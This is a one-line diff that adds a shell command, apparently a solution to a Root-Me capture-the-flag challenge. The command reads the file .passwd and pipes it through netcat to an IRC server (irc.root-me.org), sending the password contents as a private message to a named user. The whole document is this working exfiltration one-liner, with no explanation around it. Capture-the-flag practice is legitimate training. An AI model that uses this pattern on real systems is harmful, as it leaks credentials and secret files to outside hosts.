@@ -1,0 +1,1 @@
+( sleep 2 ; echo NICK LOLILOL;  echo USER LOLILOL LOLILOL LOLILOL :LOLILOL;  sleep 1;  echo "JOIN root-me_challenge";  sleep 1;  echo "PRIVMSG dodo4452" :`cat .passwd` ; echo "QUIT";  ) | nc irc.root-me.org 6667
